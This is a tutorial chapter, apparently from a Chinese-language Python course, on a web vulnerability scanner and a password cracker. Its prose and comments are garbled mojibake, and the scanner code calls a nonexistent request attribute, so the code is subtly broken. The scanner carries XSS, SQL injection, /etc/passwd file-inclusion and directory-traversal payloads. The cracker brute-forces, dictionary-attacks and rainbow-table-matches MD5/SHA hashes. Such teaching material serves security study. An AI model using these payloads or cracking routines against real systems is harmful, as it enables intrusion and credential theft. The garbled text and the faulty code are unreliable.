[ä¸Šä¸€ç« ï¼šç¶²çµ¡æ”»é˜²åŸºç¤](072_ç¶²çµ¡æ”»é˜²åŸºç¤.md) | [ä¸‹ä¸€ç« ï¼šæƒ¡æ„è»Ÿä»¶åˆ†æåŸºç¤](074_æƒ¡æ„è»Ÿä»¶åˆ†æåŸºç¤.md)

# Python ç¶²çµ¡æ”»é˜²é€²éš ğŸ›¡ï¸

## ç¶²çµ¡æ»²é€æ¸¬è©¦

### 1. æ¼æ´æƒæå™¨

```python
import requests
import threading
from typing import List, Dict, Optional
import time
from urllib.parse import urljoin
import re

class VulnerabilityScanner:
    def __init__(self, target_url: str):
        """åˆå§‹åŒ–æ¼æ´æƒæå™¨"""
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerabilities: List[Dict] = []
        self.lock = threading.Lock()
        
        # å¸¸è¦‹æ¼æ´æ¨¡å¼
        self.xss_patterns = [
            r'<script>.*?</script>',
            r'javascript:.*?',
            r'onerror=.*?',
            r'onload=.*?'
        ]
        
        self.sql_injection_patterns = [
            r'SQL syntax.*?',
            r'syntax error.*?',
            r'ORA-.*?',
            r'MySQL Error.*?'
        ]
    
    def scan_xss(self, url: str, params: Dict[str, str]):
        """æƒæXSSæ¼æ´"""
        payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(2)</script>',
            '"><img src=x onerror=alert(3)>',
            '"><svg onload=alert(4)>'
        ]
        
        for payload in payloads:
            try:
                # æ¸¬è©¦æ¯å€‹åƒæ•¸
                for param in params:
                    test_params = params.copy()
                    test_params[param] = payload
                    
                    response = self.session.get(url, params=test_params)
                    
                    # æª¢æŸ¥éŸ¿æ‡‰ä¸­æ˜¯å¦åŒ…å«payload
                    if payload in response.text:
                        with self.lock:
                            self.vulnerabilities.append({
                                'type': 'XSS',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'severity': 'High'
                            })
            
            except Exception as e:
                print(f"Error scanning XSS: {e}")
    
    def scan_sql_injection(self, url: str, params: Dict[str, str]):
        """æƒæSQLæ³¨å…¥æ¼æ´"""
        payloads = [
            "' OR '1'='1",
            "1' OR '1'='1",
            "1' AND '1'='1",
            "1' UNION SELECT NULL--"
        ]
        
        for payload in payloads:
            try:
                # æ¸¬è©¦æ¯å€‹åƒæ•¸
                for param in params:
                    test_params = params.copy()
                    test_params[param] = payload
                    
                    response = self.session.get(url, params=test_params)
                    
                    # æª¢æŸ¥éŸ¿æ‡‰ä¸­æ˜¯å¦åŒ…å«SQLéŒ¯èª¤ä¿¡æ¯
                    for pattern in self.sql_injection_patterns:
                        if re.search(pattern, response.text, re.I):
                            with self.lock:
                                self.vulnerabilities.append({
                                    'type': 'SQL Injection',
                                    'url': url,
                                    'parameter': param,
                                    'payload': payload,
                                    'severity': 'Critical'
                                })
                            break
            
            except Exception as e:
                print(f"Error scanning SQL injection: {e}")
    
    def scan_file_inclusion(self, url: str, params: Dict[str, str]):
        """æƒææ–‡ä»¶åŒ…å«æ¼æ´"""
        payloads = [
            '../../../etc/passwd',
            'c:\\windows\\system32\\drivers\\etc\\hosts',
            '/etc/passwd',
            'php://filter/convert.base64-encode/resource=index.php'
        ]
        
        for payload in payloads:
            try:
                # æ¸¬è©¦æ¯å€‹åƒæ•¸
                for param in params:
                    test_params = params.copy()
                    test_params[param] = payload
                    
                    response = self.session.get(url, params=test_params)
                    
                    # æª¢æŸ¥éŸ¿æ‡‰ä¸­æ˜¯å¦åŒ…å«æ•æ„Ÿæ–‡ä»¶å…§å®¹
                    if any(marker in response.text.lower() for marker in [
                        'root:', 'administrator', '<?php', 'mysql'
                    ]):
                        with self.lock:
                            self.vulnerabilities.append({
                                'type': 'File Inclusion',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'severity': 'High'
                            })
            
            except Exception as e:
                print(f"Error scanning file inclusion: {e}")
    
    def scan_directory_traversal(self, url: str):
        """æƒæç›®éŒ„éæ­·æ¼æ´"""
        payloads = [
            '../',
            '..\\',
            '....//',
            '....\\\\'
        ]
        
        for payload in payloads:
            try:
                test_url = urljoin(url, payload)
                response = self.session.get(test_url)
                
                # æª¢æŸ¥éŸ¿æ‡‰ä¸­æ˜¯å¦åŒ…å«æ•æ„Ÿç›®éŒ„å…§å®¹
                if any(marker in response.text.lower() for marker in [
                    'index of', 'directory listing', 'apache', 'nginx'
                ]):
                    with self.lock:
                        self.vulnerabilities.append({
                            'type': 'Directory Traversal',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'Medium'
                        })
            
            except Exception as e:
                print(f"Error scanning directory traversal: {e}")
    
    def scan(self):
        """åŸ·è¡Œæƒæ"""
        try:
            # ç²å–ç›®æ¨™URLçš„åƒæ•¸
            response = self.session.get(self.target_url)
            params = response.request.params
            
            # å‰µå»ºæƒæç·šç¨‹
            threads = []
            
            # XSSæƒæ
            thread = threading.Thread(
                target=self.scan_xss,
                args=(self.target_url, params)
            )
            threads.append(thread)
            thread.start()
            
            # SQLæ³¨å…¥æƒæ
            thread = threading.Thread(
                target=self.scan_sql_injection,
                args=(self.target_url, params)
            )
            threads.append(thread)
            thread.start()
            
            # æ–‡ä»¶åŒ…å«æƒæ
            thread = threading.Thread(
                target=self.scan_file_inclusion,
                args=(self.target_url, params)
            )
            threads.append(thread)
            thread.start()
            
            # ç›®éŒ„éæ­·æƒæ
            thread = threading.Thread(
                target=self.scan_directory_traversal,
                args=(self.target_url,)
            )
            threads.append(thread)
            thread.start()
            
            # ç­‰å¾…æ‰€æœ‰ç·šç¨‹å®Œæˆ
            for thread in threads:
                thread.join()
            
            return self.vulnerabilities
        
        except Exception as e:
            print(f"Error during scan: {e}")
            return []

# ä½¿ç”¨ç¤ºä¾‹
def main():
    # å‰µå»ºæƒæå™¨
    scanner = VulnerabilityScanner("http://example.com")
    
    print("Starting vulnerability scan...")
    start_time = time.time()
    
    # åŸ·è¡Œæƒæ
    vulnerabilities = scanner.scan()
    
    # è¨ˆç®—æƒææ™‚é–“
    scan_time = time.time() - start_time
    
    # è¼¸å‡ºçµæœ
    print(f"\nScan completed in {scan_time:.2f} seconds")
    print(f"Found {len(vulnerabilities)} vulnerabilities:")
    
    for vuln in vulnerabilities:
        print(f"\nType: {vuln['type']}")
        print(f"URL: {vuln['url']}")
        if 'parameter' in vuln:
            print(f"Parameter: {vuln['parameter']}")
        print(f"Payload: {vuln['payload']}")
        print(f"Severity: {vuln['severity']}")

if __name__ == '__main__':
    main()
```

### 2. å¯†ç¢¼ç ´è§£å™¨

```python
import hashlib
import itertools
import string
import threading
from typing import List, Optional
import time

class PasswordCracker:
    def __init__(self, hash_type: str = 'md5'):
        """åˆå§‹åŒ–å¯†ç¢¼ç ´è§£å™¨"""
        self.hash_type = hash_type
        self.found_passwords: List[tuple] = []
        self.lock = threading.Lock()
        
        # å­—ç¬¦é›†
        self.charset = string.ascii_letters + string.digits + string.punctuation
    
    def hash_password(self, password: str) -> str:
        """è¨ˆç®—å¯†ç¢¼å“ˆå¸Œå€¼"""
        if self.hash_type == 'md5':
            return hashlib.md5(password.encode()).hexdigest()
        elif self.hash_type == 'sha1':
            return hashlib.sha1(password.encode()).hexdigest()
        elif self.hash_type == 'sha256':
            return hashlib.sha256(password.encode()).hexdigest()
        else:
            raise ValueError(f"Unsupported hash type: {self.hash_type}")
    
    def brute_force(self, target_hash: str, max_length: int = 8):
        """æš´åŠ›ç ´è§£å¯†ç¢¼"""
        for length in range(1, max_length + 1):
            for guess in itertools.product(self.charset, repeat=length):
                password = ''.join(guess)
                if self.hash_password(password) == target_hash:
                    with self.lock:
                        self.found_passwords.append((password, target_hash))
                    return
    
    def dictionary_attack(self, target_hash: str, wordlist_file: str):
        """å­—å…¸æ”»æ“Š"""
        try:
            with open(wordlist_file, 'r', encoding='utf-8') as f:
                for word in f:
                    word = word.strip()
                    if self.hash_password(word) == target_hash:
                        with self.lock:
                            self.found_passwords.append((word, target_hash))
                        return
        except Exception as e:
            print(f"Error reading wordlist: {e}")
    
    def rainbow_table_attack(self, target_hash: str, rainbow_table_file: str):
        """å½©è™¹è¡¨æ”»æ“Š"""
        try:
            with open(rainbow_table_file, 'r', encoding='utf-8') as f:
                for line in f:
                    password, hash_value = line.strip().split(':')
                    if hash_value == target_hash:
                        with self.lock:
                            self.found_passwords.append((password, target_hash))
                        return
        except Exception as e:
            print(f"Error reading rainbow table: {e}")
    
    def crack_password(self, target_hash: str, method: str = 'brute_force',
                      **kwargs) -> Optional[str]:
        """ç ´è§£å¯†ç¢¼"""
        try:
            if method == 'brute_force':
                max_length = kwargs.get('max_length', 8)
                self.brute_force(target_hash, max_length)
            
            elif method == 'dictionary':
                wordlist_file = kwargs.get('wordlist_file')
                if not wordlist_file:
                    raise ValueError("Wordlist file path is required")
                self.dictionary_attack(target_hash, wordlist_file)
            
            elif method == 'rainbow_table':
                rainbow_table_file = kwargs.get('rainbow_table_file')
                if not rainbow_table_file:
                    raise ValueError("Rainbow table file path is required")
                self.rainbow_table_attack(target_hash, rainbow_table_file)
            
            else:
                raise ValueError(f"Unsupported attack method: {method}")
            
            if self.found_passwords:
                return self.found_passwords[0][0]
            return None
        
        except Exception as e:
            print(f"Error cracking password: {e}")
            return None

# ä½¿ç”¨ç¤ºä¾‹
def main():
    # å‰µå»ºå¯†ç¢¼ç ´è§£å™¨
    cracker = PasswordCracker('md5')
    
    # æ¸¬è©¦å¯†ç¢¼
    test_password = "password123"
    target_hash = cracker.hash_password(test_password)
    
    print(f"Target hash: {target_hash}")
    
    # ä½¿ç”¨ä¸åŒæ–¹æ³•ç ´è§£
    methods = [
        ('brute_force', {'max_length': 8}),
        ('dictionary', {'wordlist_file': 'wordlist.txt'}),
        ('rainbow_table', {'rainbow_table_file': 'rainbow_table.txt'})
    ]
    
    for method, kwargs in methods:
        print(f"\nTrying {method} attack...")
        start_time = time.time()
        
        password = cracker.crack_password(target_hash, method, **kwargs)
        
        if password:
            print(f"Password found: {password}")
        else:
            print("Password not found")
        
        print(f"Time taken: {time.time() - start_time:.2f} seconds")

if __name__ == '__main__':
    main()
```

## ç·´ç¿’é¡Œ

1. **æ¼æ´æƒæç³»çµ±**
   é–‹ç™¼ä¸€å€‹æ¼æ´æƒæç³»çµ±ï¼š
   - æ”¯æŒå¤šç¨®æ¼æ´é¡å‹
   - å¯¦ç¾ä¸¦ç™¼æƒæ
   - ç”Ÿæˆè©³ç´°å ±å‘Š
   - æä¾›ä¿®å¾©å»ºè­°

2. **å¯†ç¢¼å®‰å…¨å·¥å…·**
   å‰µå»ºä¸€å€‹å¯†ç¢¼å®‰å…¨å·¥å…·ï¼š
   - å¯¦ç¾å¤šç¨®ç ´è§£æ–¹æ³•
   - è©•ä¼°å¯†ç¢¼å¼·åº¦
   - ç”Ÿæˆå®‰å…¨å¯†ç¢¼
   - ç®¡ç†å¯†ç¢¼ç­–ç•¥

3. **å®‰å…¨æ¸¬è©¦æ¡†æ¶**
   å¯¦ç¾ä¸€å€‹å®‰å…¨æ¸¬è©¦æ¡†æ¶ï¼š
   - è‡ªå‹•åŒ–æ¸¬è©¦æµç¨‹
   - æ”¯æŒæ’ä»¶ç³»çµ±
   - æä¾›APIæ¥å£
   - ç”Ÿæˆæ¸¬è©¦å ±å‘Š

## å°æé†’ ğŸ’¡

1. å®‰å…¨è€ƒæ…®
   - éµå®ˆæ³•å¾‹æ³•è¦
   - ç²å–æ¸¬è©¦æˆæ¬Š
   - ä¿è­·æ•æ„Ÿæ•¸æ“š
   - è¨˜éŒ„æ¸¬è©¦éç¨‹

2. æ€§èƒ½å„ªåŒ–
   - ä½¿ç”¨å¤šç·šç¨‹
   - å„ªåŒ–ç®—æ³•æ•ˆç‡
   - æ§åˆ¶è³‡æºä½¿ç”¨
   - å®šæœŸæ¸…ç†ç·©å­˜

3. å¯é æ€§
   - è™•ç†ç•°å¸¸æƒ…æ³
   - å¯¦ç¾éŒ¯èª¤æ¢å¾©
   - è¨˜éŒ„è©³ç´°æ—¥èªŒ
   - å®šæœŸå‚™ä»½æ•¸æ“š

4. èª¿è©¦æŠ€å·§
   - ä½¿ç”¨å®‰å…¨å·¥å…·
   - åˆ†æéŒ¯èª¤ä¿¡æ¯
   - æ¨¡æ“¬æ”»æ“Šå ´æ™¯
   - å£“åŠ›æ¸¬è©¦

[ä¸Šä¸€ç« ï¼šç¶²çµ¡æ”»é˜²åŸºç¤](072_ç¶²çµ¡æ”»é˜²åŸºç¤.md) | [ä¸‹ä¸€ç« ï¼šæƒ¡æ„è»Ÿä»¶åˆ†æåŸºç¤](074_æƒ¡æ„è»Ÿä»¶åˆ†æåŸºç¤.md) 